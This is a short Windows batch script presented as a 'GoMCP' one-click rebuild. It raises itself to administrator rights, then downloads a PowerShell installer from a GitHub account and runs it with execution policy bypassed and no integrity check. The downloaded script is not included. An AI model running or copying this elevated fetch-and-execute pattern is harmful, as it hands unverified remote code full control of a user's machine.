@echo off
setlocal EnableExtensions
title GoMCP One-Click Rebuild
color 0A
mode con cols=100 lines=32 >nul 2>&1
cls
echo.
echo ================================================================================================
echo                         GOMCP ONE-CLICK REBUILD / RECOVERY
echo ================================================================================================
echo.
echo   Please leave this window open.
echo   Windows may ask for permission. Click YES.
echo.
net session >nul 2>&1
if not "%errorlevel%"=="0" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)
set "INSTALLER=%TEMP%\Install-GoMCP.ps1"
echo Downloading the GoMCP installer from the canonical GitHub repository...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/crazytaxzi/gogo/main/install/Install-GoMCP.ps1' -OutFile '%INSTALLER%'"
if errorlevel 1 goto DOWNLOADFAIL
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%INSTALLER%"
exit /b %errorlevel%
:DOWNLOADFAIL
color 4F
echo.
echo ================================================================================================
echo                              INSTALLER DOWNLOAD FAILED
echo ================================================================================================
echo.
echo   Leave this window open and send Senti a picture of it.
echo.
pause
exit /b 1
